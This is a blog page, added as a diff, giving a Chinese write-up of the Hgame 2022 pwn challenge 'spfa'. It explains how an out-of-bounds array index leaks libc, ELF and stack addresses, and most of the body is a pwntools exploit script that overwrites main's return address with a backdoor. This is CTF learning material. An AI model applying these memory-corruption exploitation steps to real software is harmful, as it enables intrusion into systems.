@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Hgame Ser_per_fa复现</title>
+    <meta name="description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta name="keywords" content='Pwn'>
+
+    <meta property="og:url" content="https://kingbridgess.github.io/posts/hgame-ser_per_fa%E5%A4%8D%E7%8E%B0/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Hgame Ser_per_fa复现">
+    <meta property="og:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="og:image" content="/images/avatar.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Hgame Ser_per_fa复现">
+    <meta name="twitter:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/hgame-ser_per_fa%E5%A4%8D%E7%8E%B0/">
+    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/hgame-ser_per_fa%E5%A4%8D%E7%8E%B0/">
+    <meta name="twitter:image" content="/images/avatar.jpg">
+
+    
+    <link rel="canonical" href="https://kingbridgess.github.io/posts/hgame-ser_per_fa%E5%A4%8D%E7%8E%B0/" />
+
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">
+
+    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/main.js"></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://kingbridgess.github.io">
+                <img src="https://kingbridgess.github.io/images/avatar.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/about"> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/about"> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Hgame Ser_per_fa复现</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            February 14, 2022
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/pwn">Pwn</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p>虽然开源，但spfa还是看得一知半解（下辈子一定学算法</p>
+<p>保护全开，题目有backdoor</p>
+<p>dist下标可控。</p>
+<p>这里可以实现任意读地址</p>
+<p><img src="https://s2.loli.net/2022/11/01/V6PsohFb2eYuBy8.png" alt="">
+而这里又可以实现任意写
+<img src="https://s2.loli.net/2022/11/01/kc7mIJRNsO83DlG.png" alt="">
+跟进发现控制add函数的参数，to为偏移，dis为要写的值即可。
+官方大致思路就是读出一堆地址，最后把main函数的返回地址写成backdoor的地址。最重要的一点就是确定stack到elf的偏移
+因为pie开了，elf,libc,stack三者地址全是随机的。下面确定三者的绝对地址。
+libc地址通过got表可以得到。</p>
+<p>elf地址通过elf文件里一个指向elf内部地址的指针可以leak。方法如下：
+搜索高2字节为elf地址高2字节(这里是0x5555)的指针
+<img src="https://s2.loli.net/2022/11/01/FxsCcI87zhrega1.png" alt="">
+比如这个指针，指向了自己
+<img src="https://s2.loli.net/2022/11/01/ItWBuxVqZm9rwMg.png" alt="">
+再算好其到dist的距离即可</p>
+<p>stack的地址:
+libc有一个三级指针地址_environ,指向栈中的environ,后者指向一个环境变量表。只要找到_environ指向的地址即可确定stack的地址。
+<img src="https://s2.loli.net/2022/11/01/FZA2TYr3uKoNcaQ.png" alt="">
+然后再计算libcBase和_environ的偏移，和environ到main函数反址的偏移。
+exp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># o_dist_elfAddr=0x55555555f720-0x55555555b008</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># o_libcEnviron_libcBase=0x7fd0fbb332e0-0x7fd0fb944000</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># o_stackEnviron_ret=0x7fffffffdf38-0x7fffffffde38</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># o_elfAddr_backdoor=0x56204f05d008-0x56204f0576a5</span>
+</span></span><span style="display:flex;"><span>o_dist_elfAddr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">18200</span>
+</span></span><span style="display:flex;"><span>o_libcEnviron_libcBase <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2028256</span>
+</span></span><span style="display:flex;"><span>o_stackEnviron_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">256</span>
+</span></span><span style="display:flex;"><span>o_elfAddr_backdoor<span style="color:#ff79c6">=</span><span style="color:#bd93f9">22883</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">=</span>process(<span style="color:#f1fa8c">&#39;./spfa&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># p=gdb.debug(&#39;./spfa&#39;)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>elf<span style="color:#ff79c6">=</span>ELF(<span style="color:#f1fa8c">&#39;./spfa&#39;</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">=</span>ELF(<span style="color:#f1fa8c">&#39;libc-2.31.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#libcBase</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many datas?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many nodes?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many edges?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;you want to start from which node?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>o<span style="color:#ff79c6">=-</span>(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;dist&#39;</span>]<span style="color:#ff79c6">-</span>elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;puts&#39;</span>])<span style="color:#ff79c6">//</span><span style="color:#bd93f9">8</span>
+</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">bytes</span>(<span style="color:#8be9fd;font-style:italic">str</span>(o)<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;to ?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>, pay)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;the length of the shortest path is &#39;</span>)
+</span></span><span style="display:flex;"><span>libcBase<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">int</span>((p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>, drop<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>))) <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>success(<span style="color:#f1fa8c">&#39;libBase = &#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">hex</span>(libcBase))
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#elfAddr</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many nodes?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many edges?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;you want to start from which node?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>o<span style="color:#ff79c6">=-</span>(o_dist_elfAddr)<span style="color:#ff79c6">//</span><span style="color:#bd93f9">8</span>
+</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">bytes</span>(<span style="color:#8be9fd;font-style:italic">str</span>(o)<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;to ?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>, pay)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;the length of the shortest path is &#39;</span>)
+</span></span><span style="display:flex;"><span>elfAddr<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">int</span>((p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>, drop<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>)))
+</span></span><span style="display:flex;"><span>success(<span style="color:#f1fa8c">&#39;elfAddr = &#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">hex</span>(elfAddr))
+</span></span><span style="display:flex;"><span>o_libcBase_elfAddr <span style="color:#ff79c6">=</span> libcBase <span style="color:#ff79c6">-</span> elfAddr
+</span></span><span style="display:flex;"><span>o_libcEnviron_dist <span style="color:#ff79c6">=</span> o_libcEnviron_libcBase <span style="color:#ff79c6">+</span>  o_libcBase_elfAddr <span style="color:#ff79c6">-</span> o_dist_elfAddr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#stackEnviron</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many nodes?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many edges?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;you want to start from which node?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>o<span style="color:#ff79c6">=</span>(o_libcEnviron_dist)<span style="color:#ff79c6">//</span><span style="color:#bd93f9">8</span>
+</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">bytes</span>(<span style="color:#8be9fd;font-style:italic">str</span>(o)<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;to ?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>, pay)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;the length of the shortest path is &#39;</span>)
+</span></span><span style="display:flex;"><span>stackEnviron<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">int</span>((p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>, drop<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>)))
+</span></span><span style="display:flex;"><span>success(<span style="color:#f1fa8c">&#39;stackEnviron = &#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">hex</span>(stackEnviron))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>o_stackEnviron_libcBase <span style="color:#ff79c6">=</span> stackEnviron <span style="color:#ff79c6">-</span> libcBase
+</span></span><span style="display:flex;"><span>o_ret_dist <span style="color:#ff79c6">=</span> o_libcBase_elfAddr <span style="color:#ff79c6">-</span> o_dist_elfAddr <span style="color:#ff79c6">+</span> o_stackEnviron_libcBase <span style="color:#ff79c6">+</span> o_stackEnviron_ret<span style="color:#ff79c6">-</span><span style="color:#bd93f9">512</span>
+</span></span><span style="display:flex;"><span>backdoor <span style="color:#ff79c6">=</span> elfAddr <span style="color:#ff79c6">-</span> o_elfAddr_backdoor
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#overwrite main ret addr</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many nodes?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;how many edges?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0 &#39;</span><span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">bytes</span>(<span style="color:#8be9fd;font-style:italic">str</span>(o_ret_dist<span style="color:#ff79c6">//</span><span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>)) <span style="color:#ff79c6">+</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39; &#39;</span><span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">bytes</span>(<span style="color:#8be9fd;font-style:italic">str</span>(backdoor)<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdb<span style="color:#ff79c6">.</span>attach(p)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;input edges in the</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">[from] [to] [distant]</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">format</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>,pay)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;you want to start from which node?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>,<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;to ?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#39;</span>,<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>interactive()
+</span></span></code></pre></div><p>然而最后调system又没有字节对齐qwq（不管了摆了
+<img src="https://s2.loli.net/2022/11/01/ldEVi7Mv3kC8nUf.png" alt=""></p>
+<p>或者，不需要知道stack的地址。因为puts调用了libc中的strlen函数，strlen的got表是可以改的(在libc elf里)。具体参照<a href="https://www.novanoir.moe/2022/02/12/hgame-2022-week1-pwn-writeups/">nova gg的博客</a></p>
+
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents"></nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2022 </span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
